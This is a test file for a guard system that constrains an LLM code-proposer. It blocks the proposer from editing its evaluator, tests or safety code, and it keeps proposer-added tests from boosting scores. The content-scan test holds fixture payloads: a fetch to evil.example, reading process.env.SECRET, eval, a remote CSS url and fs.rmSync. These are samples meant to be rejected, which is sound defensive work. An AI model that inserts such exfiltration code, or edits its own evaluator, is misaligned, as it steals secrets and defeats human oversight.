import assert from "node:assert/strict";
import test from "node:test";
import { applyProposal, buildPolicy, checkEditPath, classifyZone } from "../scripts/asi/policy.mjs";
import { auditCss, contrastRatio, parseColor } from "../scripts/asi/ui-audit.mjs";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { collectMetrics, evaluateCandidate } from "../scripts/asi/core.mjs";
import { parseProposal } from "../scripts/asi/llm.mjs";

const policy = buildPolicy();

test("the proposer cannot edit its own evaluator", () => {
  for (const path of ["scripts/run-quality-70.mjs", "tests/i18n.test.ts", "benchmarks/x.json", "package.json", "vite.config.ts", "START-USERWARD.cmd", "../outside.ts", "C:/x.ts", "app/../package.json"]) {
    assert.equal(checkEditPath(path, policy).ok, false, path);
  }
  assert.equal(checkEditPath("app/lib/safety-experience.ts", policy).ok, false);
  assert.equal(checkEditPath("app/api/providers/chat/route.ts", policy).ok, false);
  assert.equal(checkEditPath("app/page.tsx", policy).ok, true);
  assert.equal(checkEditPath("app/globals.css", policy).ok, true);
  assert.equal(checkEditPath("app/favicon.svg", policy).ok, false);
});

test("RED zone covers side-effect, provider, auth code and the upgrade guard itself; config cannot unprotect it", () => {
  for (const path of ["app/api/hands/route.ts", "app/api/tools/web-search/route.ts", "app/lib/hands.ts", "app/lib/send-guards.ts", "app/lib/custom-provider.ts", "app/lib/adaptive-preferences.ts", "app/chatgpt-auth.ts"]) {
    assert.equal(classifyZone(path), "red", path);
  }
  const relaxed = buildPolicy({ protected: [], editable: ["app/", "scripts/"] });
  assert.equal(checkEditPath("app/lib/safety-experience.ts", relaxed).ok, false);
  assert.equal(checkEditPath("scripts/asi/policy.mjs", relaxed).ok, false);
  const stricter = buildPolicy({ protected: ["app/lib/prompt-pack.ts"] });
  assert.equal(classifyZone("app/lib/prompt-pack.ts", stricter), "red");
  assert.equal(classifyZone("app/page.tsx"), "yellow");
  assert.equal(classifyZone("app/globals.css"), "green");
  assert.equal(classifyZone("app/lib/answer-quality.ts"), "green");
});

test("content scan blocks exfiltration, eval, secrets and wholesale rewrites", () => {
  const big = `export const x = 1;\n${"// filler line of code\n".repeat(200)}`;
  const files = { "app/lib/answer-quality.ts": big, "app/page.tsx": big, "app/globals.css": ".a{color:#000}" };
  const read = path => files[path] ?? null;
  const bad = (edits) => applyProposal({ edits }, read, policy);
  assert.match(bad([{ path: "app/lib/answer-quality.ts", search: "export const x = 1;", replace: "export const x = 1; fetch('https://evil.example/x');" }]).errors.join(), /adds fetch|external URL/);
  assert.match(bad([{ path: "app/lib/answer-quality.ts", search: "export const x = 1;", replace: "export const x = process.env.SECRET;" }]).errors.join(), /process\.env/);
  assert.match(bad([{ path: "app/lib/answer-quality.ts", search: "export const x = 1;", replace: "export const x = eval('1');" }]).errors.join(), /eval/);
  assert.match(bad([{ path: "app/page.tsx", search: "export const x = 1;", replace: "x".repeat(3_001) }]).errors.join(), /too large for yellow/);
  assert.match(bad([{ path: "app/lib/answer-quality.ts", search: big, replace: "export const x = 2;" }]).errors.join(), /shrinks/);
  assert.match(bad([{ path: "app/globals.css", search: ".a{color:#000}", replace: ".a{background:url(https://evil.example/p.png)}" }]).errors.join(), /remote url/);
  assert.equal(bad([{ path: "app/lib/answer-quality.ts", search: "export const x = 1;", replace: "export const x = 2;" }]).ok, true);
  assert.match(applyProposal({ newFiles: [{ path: "tests/asi/t.test.ts", content: "import fs from 'node:fs'; fs.rmSync('x');" }] }, read, policy).errors.join(), /may not touch fs/);
});

test("new tests only under tests/asi and never overwriting", () => {
  assert.equal(checkEditPath("tests/asi/fix.test.ts", policy, { creating: true }).ok, true);
  assert.equal(checkEditPath("tests/asi/helper.ts", policy, { creating: true }).ok, false);
  assert.equal(checkEditPath("tests/i18n.test.ts", policy, { creating: true }).ok, false);
  const files = { "tests/asi/fix.test.ts": "old" };
  const result = applyProposal({ newFiles: [{ path: "tests/asi/fix.test.ts", content: "x" }] }, path => files[path] ?? null, policy);
  assert.equal(result.ok, false);
});

test("search/replace must match exactly once and edits chain", () => {
  const files = { "app/a.css": ".a { color: #777; }\n.b { color: #777; }\n" };
  const read = path => files[path] ?? null;
  assert.equal(applyProposal({ edits: [{ path: "app/a.css", search: "color: #777;", replace: "color: #333;" }] }, read, policy).ok, false);
  const ok = applyProposal({ edits: [
    { path: "app/a.css", search: ".a { color: #777; }", replace: ".a { color: #333; }" },
    { path: "app/a.css", search: ".b { color: #777; }", replace: ".b { color: #222; }" },
  ] }, read, policy);
  assert.equal(ok.ok, true);
  assert.equal(ok.changed.get("app/a.css"), ".a { color: #333; }\n.b { color: #222; }\n");
  assert.equal(files["app/a.css"].includes("#777"), true, "applyProposal must not write");
  assert.equal(applyProposal({ edits: [] }, read, policy).ok, false);
});

test("contrast math matches WCAG reference values", () => {
  assert.equal(Math.round(contrastRatio(parseColor("#000"), parseColor("#fff")) * 10) / 10, 21);
  assert.equal(Math.round(contrastRatio(parseColor("#777777"), parseColor("#ffffff")) * 100) / 100, 4.48);
  assert.deepEqual(parseColor("rgb(255, 0, 0)").slice(0, 3), [255, 0, 0]);
});

test("UI audit finds low-contrast rules and resolves variables", () => {
  const css = ":root { --muted: #aaaaaa; }\n.ok { color: #111; background: #fff; }\n.bad { color: var(--muted); background-color: #ffffff; }\n.x { color: red !important; }";
  const audit = auditCss(css);
  assert.equal(audit.contrastFails, 1);
  assert.equal(audit.importantCount, 1);
  assert.match(audit.worst[0].selector, /\.bad/);
});

const metrics = (over = {}) => ({ testsPassed: 100, testsFailed: 1, qualityPassRate: 90, qualitySavedPct: 30, buildMs: 1000, clientJsBytes: 500_000, clientCssBytes: 80_000, ui: { contrastFails: 5, minContrast: 2, importantCount: 10, fontSizeVariants: 8, cssBytes: 80_000, worst: [] }, ...over });
const gates = (overrides = {}) => ["contracts", "i18n", "build"].map(id => ({ id, ok: overrides[id] ?? true }));

test("evaluation rejects any regression against baseline", () => {
  const baseline = { gates: gates({ contracts: false }), metrics: metrics() };
  assert.equal(evaluateCandidate({ tier: 3, baseline, candidate: { gates: gates({ contracts: false, i18n: false }), metrics: metrics() } }).verdict, "rejected");
  assert.equal(evaluateCandidate({ tier: 2, baseline, candidate: { gates: gates({ contracts: false }), metrics: metrics({ qualityPassRate: 80 }) } }).verdict, "rejected");
  assert.equal(evaluateCandidate({ tier: 3, baseline, candidate: { gates: gates({ contracts: false }), metrics: metrics({ ui: { ...metrics().ui, contrastFails: 6 } }) } }).verdict, "rejected");
});

test("evaluation scores objective gains and defers taste to the user", () => {
  const baseline = { gates: gates({ contracts: false }), metrics: metrics() };
  const better = evaluateCandidate({ tier: 3, baseline, candidate: { gates: gates(), metrics: metrics({ ui: { ...metrics().ui, contrastFails: 2 } }) } });
  assert.equal(better.verdict, "improved");
  assert.ok(better.score > 0);
  assert.equal(evaluateCandidate({ tier: 3, baseline, candidate: { gates: gates({ contracts: false }), metrics: metrics() } }).verdict, "needs_user_check");
});

test("proposer-added tests gate but never score", () => {
  const dir = mkdtempSync(join(tmpdir(), "asi-metrics-"));
  try {
    const gates = [
      { id: "contracts", kind: "test", ok: true, pass: 10, fail: 0 },
      { id: "asi-new-tests", kind: "test", ok: true, pass: 50, fail: 0 },
    ];
    assert.equal(collectMetrics(dir, gates).testsPassed, 10);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("model replies are parsed defensively", () => {
  const parsed = parseProposal("```json\n{\"summary\":\"s\",\"edits\":[{\"path\":\"app/a.css\",\"search\":\"a\",\"replace\":\"b\"}]}\n```");
  assert.equal(parsed.edits.length, 1);
  assert.deepEqual(parsed.newFiles, []);
  assert.throws(() => parseProposal("no json here"));
});
